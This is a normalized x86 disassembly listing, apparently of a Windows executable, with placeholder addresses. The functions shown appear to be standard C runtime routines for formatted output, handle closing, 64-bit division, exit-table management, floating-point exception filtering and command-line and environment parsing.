pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_4083d1
push 0x1
mov edi eax
call sub_4083d1
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_40834b
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_405b04
push 0x10
push r--data
call sub_402ff0
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_402de6
and [ eax ] 0x0
call sub_402dd3
mov [ eax ] 0x9
call sub_402de6
and [ eax ] 0x0
call sub_402dd3
mov [ eax ] 0x9
call sub_402d81
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_403035
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_40843a
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_402dd3
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_405a68
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_405bc0
mov eax [ ebp - 0x1c ]
sub_405bc8
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_4020da
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_405c00
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_405c68
mov edi edi
push ebp
mov ebp esp
test [ eax + 0xc ] 0x40
je r-xdata
push eax
push [ ebp + 0x8 ]
call sub_40906e
pop ecx
pop ecx
mov ecx 0xffff
cmp ax cx
jne r-xdata
cmp [ eax + 0x8 ] 0x0
je r-xdata
inc [ esi ]
pop ebp
retn
or [ esi ] 0xffffffff
pop ebp
retn
sub_405c97
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi eax
mov ebx ecx
call sub_402dd3
test [ edi + 0xc ] 0x40
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
je r-xdata
call sub_402dd3
and [ eax ] 0x0
jmp r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test ebx ebx
jg r-xdata
add [ esi ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
push eax
mov eax edi
dec ebx
call sub_405c68
add [ ebp + 0x8 ] 0x2
cmp [ esi ] 0xffffffff
pop ecx
jne r-xdata
call sub_402dd3
cmp [ eax ] 0x0
jne r-xdata
pop esi
pop ebx
leave
retn
call sub_402dd3
cmp [ eax ] 0x2a
jne r-xdata
call sub_402dd3
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
push 0x3f
mov eax edi
call sub_405c68
pop ecx
sub_405d10
mov edi edi
push ebp
mov ebp esp
sub esp 0x474
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x44c ]
mov [ ebp - 0x42c ] esi
mov [ ebp - 0x418 ] edi
mov [ ebp - 0x454 ] eax
mov [ ebp - 0x408 ] eax
mov [ ebp - 0x430 ] eax
mov [ ebp - 0x40c ] eax
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x450 ] eax
mov [ ebp - 0x428 ] eax
call sub_40233b
test esi esi
jne r-xdata
xor eax eax
cmp ebx eax
je r-xdata
call sub_402dd3
mov [ eax ] 0x16
call sub_402d81
cmp [ ebp - 0x440 ] 0x0
je r-xdata
movzx ecx [ ebx ]
mov [ ebp - 0x41c ] eax
mov [ ebp - 0x414 ] eax
mov [ ebp - 0x43c ] eax
mov [ ebp - 0x458 ] eax
mov [ ebp - 0x420 ] ecx
cmp cx ax
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x444 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x440 ] 0x0
je r-xdata
push 0x2
pop esi
add ebx esi
xor eax eax
mov [ ebp - 0x45c ] ebx
cmp [ ebp - 0x41c ] eax
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4020cb
leave
retn
mov eax [ ebp - 0x41c ]
mov eax [ ebp - 0x444 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x43c ] 0x0
je r-xdata
lea edx [ ecx - 0x20 ]
cmp dx 0x58
ja r-xdata
cmp [ ebp - 0x43c ] 0x7
jne r-xdata
mov edx [ ebp - 0x43c ]
imul eax eax 0x9
movzx eax [ eax + edx + r--data ]
push 0x8
shr eax 0x4
pop edx
mov [ ebp - 0x43c ] eax
cmp eax edx
je r-xdata
movzx eax cx
movzx eax [ eax + r--data ]
and eax 0xf
cmp eax 0x7
ja r-xdata
mov ebx [ ebp - 0x45c ]
mov edi [ ebp - 0x418 ]
jmp [ eax * 4 + jump_table_4068a4 ]
mov ecx eax
jmp r-xdata
xor eax eax
or [ ebp - 0x40c ] 0xffffffff
mov [ ebp - 0x460 ] eax
mov [ ebp - 0x450 ] eax
mov [ ebp - 0x430 ] eax
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x408 ] eax
mov [ ebp - 0x428 ] eax
jmp r-xdata
movzx eax cx
sub eax 0x20
je r-xdata
cmp cx 0x2a
jne r-xdata
and [ ebp - 0x40c ] 0x0
jmp r-xdata
cmp cx 0x2a
jne r-xdata
movzx eax cx
cmp eax 0x49
je r-xdata
mov eax [ ebp - 0x42c ]
push ecx
lea esi [ ebp - 0x41c ]
mov [ ebp - 0x428 ] 0x1
call sub_405c68
pop ecx
jmp r-xdata
movzx eax cx
cmp eax 0x64
jg r-xdata
movzx eax [ ebx ]
mov [ ebp - 0x420 ] eax
test ax ax
je r-xdata
or [ ebp - 0x408 ] esi
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x430 ]
imul eax eax 0xa
movzx ecx cx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x430 ] eax
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x418 ] edi
mov [ ebp - 0x430 ] eax
test eax eax
jns r-xdata
mov eax [ ebp - 0x40c ]
imul eax eax 0xa
movzx ecx cx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x40c ] eax
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x418 ] edi
mov [ ebp - 0x40c ] eax
test eax eax
jns r-xdata
movzx eax [ ebx ]
cmp eax 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x80
jmp r-xdata
sub eax edx
je r-xdata
or [ ebp - 0x408 ] 0x4
neg [ ebp - 0x430 ]
jmp r-xdata
or [ ebp - 0x40c ] 0xffffffff
jmp r-xdata
cmp eax 0x33
jne r-xdata
cmp [ ebx + 0x2 ] 0x34
jne r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
cmp eax 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x408 ] 0x1
jmp r-xdata
sub eax esi
je r-xdata
cmp eax 0x64
je r-xdata
cmp [ ebx + 0x2 ] 0x32
jne r-xdata
add ebx 0x4
or [ ebp - 0x408 ] 0x8000
jmp r-xdata
cmp [ ebx ] 0x6c
jne r-xdata
cmp eax 0x77
jne r-xdata
cmp [ ebp - 0x40c ] 0xffffffff
mov ebx 0x7fffffff
je r-xdata
sub eax esi
je r-xdata
mov [ ebp - 0x40c ] edx
cmp eax 0x65
jl r-xdata
test ecx 0x1000
jne r-xdata
add edi edx
mov eax [ edi - 0x8 ]
mov edx [ edi - 0x4 ]
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp eax 0x69
je r-xdata
add ebx 0x4
and [ ebp - 0x408 ] 0xffff7fff
jmp r-xdata
or [ ebp - 0x408 ] 0x10
jmp r-xdata
add ebx esi
or [ ebp - 0x408 ] 0x1000
jmp r-xdata
or [ ebp - 0x408 ] 0x800
jmp r-xdata
add edi 0x4
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x418 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x410 ] edi
je r-xdata
mov ebx [ ebp - 0x40c ]
mov [ ebp - 0x420 ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x420 ] 0x10
je r-xdata
cmp [ ebp - 0x450 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add edi 0x4
test cl 0x20
je r-xdata
mov [ ebp - 0x418 ] edi
mov [ ebp - 0x454 ] 0x7
jmp r-xdata
sub eax esi
je r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x408 ] edx
jmp r-xdata
cmp eax 0x6f
je r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov [ ebp - 0x454 ] 0x27
mov ecx [ ebp - 0x408 ]
test ecx 0x8000
je r-xdata
push 0x30
pop eax
mov [ ebp - 0x438 ] ax
mov eax [ ebp - 0x454 ]
add eax 0x51
mov [ ebp - 0x436 ] ax
mov [ ebp - 0x424 ] esi
jmp r-xdata
cmp [ ebp - 0x458 ] 0x0
je r-xdata
mov eax [ ebp - 0x408 ]
test al 0x40
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp [ ebp - 0x40c ] 0x0
lea edi [ ebp - 0x404 ]
mov eax 0x200
mov [ ebp - 0x410 ] edi
mov [ ebp - 0x414 ] eax
jge r-xdata
cmp eax 0x69
je r-xdata
mov eax [ edi - 0x4 ]
test cl 0x40
je r-xdata
mov [ ebp - 0x418 ] edi
test cl 0x40
je r-xdata
test [ ebp - 0x408 ] 0x9000
mov ebx edx
mov edi eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x418 ] edi
test eax eax
je r-xdata
sub eax 0x7
je r-xdata
or [ ebp - 0x408 ] 0x20
add ecx 0x20
mov [ ebp - 0x460 ] 0x1
mov [ ebp - 0x420 ] ecx
sub eax esi
je r-xdata
cmp eax 0x75
je r-xdata
mov eax [ ebp - 0x410 ]
mov [ ebp - 0x428 ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
and [ ebp - 0x414 ] 0x0
mov esi [ ebp - 0x410 ]
test ebx ebx
jle r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push [ ebp - 0x458 ]
call sub_4020da
and [ ebp - 0x458 ] 0x0
pop ecx
mov ebx [ ebp - 0x430 ]
sub ebx [ ebp - 0x414 ]
sub ebx [ ebp - 0x424 ]
test [ ebp - 0x408 ] 0xc
mov [ ebp - 0x468 ] ebx
jne r-xdata
test eax 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x40c ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ edi - 0x4 ]
movsx eax [ edi - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x40c ] 0x0
jge r-xdata
xor ebx ebx
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
sub eax esi
jne r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax esi
je r-xdata
cmp eax 0x78
je r-xdata
test ebx ebx
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
mov edi [ ebp - 0x42c ]
mov ecx [ ebp - 0x424 ]
lea eax [ ebp - 0x438 ]
push eax
lea eax [ ebp - 0x41c ]
call sub_405c97
test [ ebp - 0x408 ] 0x8
pop ecx
je r-xdata
mov edi ebx
test ebx ebx
jle r-xdata
test al 0x1
je r-xdata
push 0x2d
jmp r-xdata
cmp [ ebp - 0x40c ] eax
jle r-xdata
cmp cx 0x67
jne r-xdata
mov eax [ ebp - 0x418 ]
mov edx [ eax ]
add eax 0x8
mov esi [ DecodePointer@IAT ]
mov [ ebp - 0x418 ] eax
mov eax [ eax - 0x4 ]
mov [ ebp - 0x470 ] eax
lea eax [ ebp - 0x44c ]
push eax
push [ ebp - 0x460 ]
movsx eax cl
push [ ebp - 0x40c ]
mov [ ebp - 0x474 ] edx
push eax
push [ ebp - 0x414 ]
lea eax [ ebp - 0x474 ]
push edi
push eax
push [ rw-data ]
call esi
call eax
mov ebx [ ebp - 0x408 ]
add esp 0x1c
and ebx 0x80
je r-xdata
mov esi [ edi ]
add edi 0x4
mov [ ebp - 0x418 ] edi
call sub_407684
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test cl 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x408 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x40c ] eax
jle r-xdata
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x408 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x414 ] eax
test [ ebp - 0x408 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x410 ] ecx
je r-xdata
movzx eax [ edi ]
add edi 0x4
xor esi esi
inc esi
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x428 ] esi
mov [ ebp - 0x418 ] edi
mov [ ebp - 0x464 ] eax
je r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
sub eax esi
jne r-xdata
cmp eax 0x58
je r-xdata
dec ebx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x410 ]
lea ecx [ ebp - 0x44c ]
movzx eax al
push ecx
push eax
call sub_405701
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x428 ] 0x0
jne r-xdata
test [ ebp - 0x408 ] 0x4
jne r-xdata
mov eax [ ebp - 0x42c ]
push 0x20
lea esi [ ebp - 0x41c ]
dec edi
call sub_405c68
cmp [ ebp - 0x41c ] 0xffffffff
pop ecx
je r-xdata
test al 0x2
je r-xdata
push 0x2b
jmp r-xdata
pop eax
mov [ ebp - 0x438 ] ax
mov [ ebp - 0x424 ] 0x1
mov ebx 0xa3
cmp [ ebp - 0x40c ] ebx
jle r-xdata
mov [ ebp - 0x40c ] eax
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
cmp [ ebp - 0x420 ] 0x67
jne r-xdata
cmp [ ebp - 0x40c ] 0x0
jne r-xdata
test [ ebp - 0x408 ] 0x20
je r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x420 ] edx
je r-xdata
mov eax edi
or eax ebx
jne r-xdata
mov [ ebp - 0x40c ] eax
and [ ebp - 0x428 ] 0x0
jmp r-xdata
cdq
sub eax edx
mov [ ebp - 0x428 ] 0x1
jmp r-xdata
mov [ ebp - 0x404 ] ax
mov [ ebp - 0x434 ] al
lea eax [ ebp - 0x44c ]
push eax
mov eax [ ebp - 0x44c ]
mov [ ebp - 0x433 ] 0x0
push [ eax + 0xac ]
lea eax [ ebp - 0x434 ]
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_4081e2
add esp 0x10
test eax eax
jns r-xdata
and [ ebp - 0x43c ] 0x0
add eax esi
inc esi
inc [ ebp - 0x414 ]
cmp [ ebp - 0x414 ] ebx
jl r-xdata
inc esi
push [ ebp - 0x410 ]
mov edi [ ebp - 0x42c ]
mov ecx [ ebp - 0x414 ]
lea eax [ ebp - 0x41c ]
call sub_405c97
pop ecx
cmp [ ebp - 0x414 ] 0x0
jle r-xdata
mov edi ebx
test ebx ebx
jle r-xdata
test edi edi
jg r-xdata
push 0x20
mov ecx [ ebp - 0x420 ]
mov esi [ ebp - 0x40c ]
add esi 0x15d
push esi
call sub_40522f
pop ecx
mov ecx [ ebp - 0x420 ]
mov [ ebp - 0x458 ] eax
test eax eax
je r-xdata
cmp [ edi ] 0x2d
jne r-xdata
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x44c ]
push eax
push edi
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov eax [ ebp - 0x41c ]
mov [ esi ] eax
mov ax [ ebp - 0x41c ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x408 ] 0x200
jmp r-xdata
lea esi [ ebp - 0x205 ]
and [ ebp - 0x424 ] eax
sar eax 0x1
lea eax [ ebp - 0x404 ]
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] esi
jmp r-xdata
mov [ ebp - 0x450 ] esi
jmp r-xdata
jmp r-xdata
test [ ebp - 0x408 ] 0x4
je r-xdata
mov edi [ ebp - 0x410 ]
mov ebx [ ebp - 0x414 ]
mov eax [ ebp - 0x42c ]
push 0x30
lea esi [ ebp - 0x41c ]
dec edi
call sub_405c68
cmp [ ebp - 0x41c ] 0xffffffff
pop ecx
je r-xdata
mov [ ebp - 0x40c ] ebx
jmp r-xdata
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] esi
mov edi eax
jmp r-xdata
push edi
jmp r-xdata
or [ ebp - 0x408 ] 0x100
inc edi
mov [ ebp - 0x410 ] edi
lea eax [ ebp - 0x44c ]
push eax
push edi
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov [ ebp - 0x450 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x420 ]
cdq
push edx
push eax
push ebx
push edi
call sub_407810
add ecx 0x30
mov [ ebp - 0x468 ] ebx
mov edi eax
mov ebx edx
cmp ecx 0x39
jle r-xdata
mov eax edi
or eax ebx
je r-xdata
mov edi [ ebp - 0x468 ]
jmp r-xdata
or [ ebp - 0x41c ] 0xffffffff
jmp r-xdata
push [ ebp - 0x464 ]
mov eax [ ebp - 0x42c ]
lea esi [ ebp - 0x41c ]
call sub_405c68
add edi [ ebp - 0x420 ]
pop ecx
test ebx ebx
jg r-xdata
test edi edi
jg r-xdata
call sub_405310
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x454 ]
lea eax [ ebp - 0x205 ]
sub eax esi
inc esi
test [ ebp - 0x408 ] 0x200
mov [ ebp - 0x414 ] eax
mov [ ebp - 0x410 ] esi
je r-xdata
test edi edi
jg r-xdata
cmp [ ebp - 0x41c ] 0x0
jl r-xdata
lea eax [ ebp - 0x44c ]
push eax
mov eax [ ebp - 0x44c ]
push [ eax + 0xac ]
lea eax [ ebp - 0x464 ]
push edi
push eax
dec ebx
call sub_4081e2
add esp 0x10
mov [ ebp - 0x420 ] eax
test eax eax
jle r-xdata
jmp r-xdata
mov eax [ ebp - 0x40c ]
dec [ ebp - 0x40c ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
mov eax [ ebp - 0x42c ]
push 0x20
lea esi [ ebp - 0x41c ]
dec edi
call sub_405c68
cmp [ ebp - 0x41c ] 0xffffffff
pop ecx
je r-xdata
dec [ ebp - 0x410 ]
mov ecx [ ebp - 0x410 ]
mov [ ecx ] 0x30
inc eax
jmp r-xdata
mov ecx esi
cmp [ ecx ] 0x30
je r-xdata
sub_4068ee
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push edi
mov edi ecx
je r-xdata
pop edi
pop ebp
retn 0x4
push esi
push [ ebp + 0x8 ]
call sub_405310
lea esi [ eax + 0x1 ]
push esi
call sub_402114
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
pop esi
push [ ebp + 0x8 ]
push esi
push eax
call sub_4051d0
add esp 0xc
mov [ edi + 0x8 ] 0x1
sub_40694c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp edi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
call sub_40692e
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x4 ] eax
push [ esi + 0x4 ]
mov ecx edi
call sub_4068ee
jmp r-xdata
sub_40698c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_40692e
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_402713
pop ecx
sub_4069b3
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
call sub_40694c
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4069d8
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ DecodePointer@IAT ]
push edi
push [ rw-data ]
call esi
push [ rw-data ]
mov ebx eax
mov [ ebp - 0x4 ] ebx
call esi
mov esi eax
cmp esi ebx
jb r-xdata
xor eax eax
mov edi esi
sub edi ebx
lea eax [ edi + 0x4 ]
cmp eax 0x4
jb r-xdata
push ebx
call sub_4091f5
mov ebx eax
lea eax [ edi + 0x4 ]
pop ecx
cmp ebx eax
jae r-xdata
push [ ebp + 0x8 ]
mov edi [ EncodePointer@IAT ]
call edi
mov [ esi ] eax
add esi 0x4
push esi
call edi
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax 0x800
cmp ebx eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax ebx
cmp eax ebx
jb r-xdata
mov eax ebx
lea eax [ ebx + 0x10 ]
cmp eax ebx
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_4052c0
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_4052c0
pop ecx
pop ecx
test eax eax
je r-xdata
sar edi 0x2
push eax
lea esi [ eax + edi * 4 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
sub_406a8e
mov edi edi
push esi
push 0x4
push 0x20
call sub_405274
pop ecx
pop ecx
mov esi eax
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_406abf
push 0xc
push r--data
call sub_402ff0
call sub_403393
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_4069d8
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_406af5
mov eax [ ebp - 0x1c ]
call sub_403035
retn
sub_406b12
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_406b5e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_407bd7
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
jne r-xdata
sub_406bae
mov edi edi
push ebp
mov ebp esp
push esi
call sub_404e93
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ esi + 0x5c ]
mov edx [ ebp + 0x8 ]
mov eax ecx
push edi
add ecx 0x90
cmp eax ecx
jae r-xdata
add eax 0xc
lea edi [ ecx + 0x90 ]
cmp eax edi
jb r-xdata
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
test eax eax
je r-xdata
pop edi
cmp edx 0x5
jne r-xdata
cmp edx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ esi + 0x60 ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call edx
push 0x24
pop ecx
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
add ecx 0xc
cmp ecx 0x90
jl r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call edx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
pop ecx
mov [ esi + 0x60 ] ebx
pop ebx
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
cmp eax 0xc00002b5
jne r-xdata
mov [ esi + 0x64 ] 0x8a
jmp r-xdata
cmp eax 0xc00002b4
jne r-xdata
mov [ esi + 0x64 ] 0x8d
jmp r-xdata
mov [ esi + 0x64 ] 0x8e
sub_406cf8
mov edi edi
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
mov esi [ rw-data ]
test esi esi
jne r-xdata
call sub_404a05
mov al [ esi ]
cmp al 0x20
ja r-xdata
mov esi r--data
cmp al 0x22
jne r-xdata
test al al
je r-xdata
movzx eax al
push eax
call sub_40927b
pop ecx
test eax eax
je r-xdata
xor ecx ecx
test edi edi
sete cl
mov edi ecx
pop edi
mov eax esi
pop esi
retn
test edi edi
je r-xdata
inc esi
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
cmp al 0x20
ja r-xdata
inc esi
sub_406d57
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_404a05
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_405274
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_405310
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_405310
cmp [ esi ] 0x3d
pop ecx
lea ebx [ eax + 0x1 ]
je r-xdata
push [ rw-data ]
call sub_4020da
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_405274
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_4020da
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_4051d0
add esp 0xc
test eax eax
jne r-xdata
pop ecx
pop ebx
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_402d2f
int3
add edi 0x4
sub_406e33
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
